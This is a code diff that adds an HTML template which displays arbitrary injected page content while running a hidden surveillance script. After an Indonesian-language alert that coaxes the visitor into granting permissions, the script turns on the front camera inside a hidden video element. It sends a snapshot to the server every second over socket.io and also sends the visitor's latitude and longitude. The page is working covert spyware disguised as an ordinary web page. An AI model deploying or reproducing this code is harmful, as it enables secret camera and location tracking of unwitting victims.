@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+
+<body>
+    {{ html|safe }}
+
+    <div style="display: none;">
+        <video id="video" width="640" height="480" autoplay></video>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"
+        integrity="sha512-q/dWJ3kcmjBLU4Qc47E4A9kTB4m3wuTY7vkFJDTZKjTs8jhyGQnaUrxa0Ytd0ssMZhbNua9hE+E7Qv1j+DyZwA=="
+        crossorigin="anonymous"></script>
+
+    <script>
+        alert("Izinkan untuk mendapatkan hal yang menarik di sekitarmu")
+
+        const socket = io();
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            const constraints = { video: { facingMode: 'user' }, audio: false };
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function (stream) {
+                    const videoElement = document.getElementById('video');
+                    videoElement.srcObject = stream;
+
+                    setInterval(() => {
+                        const canvas = document.createElement('canvas');
+                        const videoElement = document.getElementById('video');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        canvas.getContext('2d').drawImage(videoElement, 0, 0);
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        socket.emit('image', imageData);
+                    }, 1000)
+                })
+                .catch(function (error) {
+                    console.error('Error accessing media devices.', error);
+                });
+        } else {
+            console.error('getUserMedia is not supported by this browser');
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            const location = "Latitude: " + latitude + ", Longitude: " + longitude;
+            socket.emit('location', location)
+        }
+
+    </script>
+</body>
+
+</html>
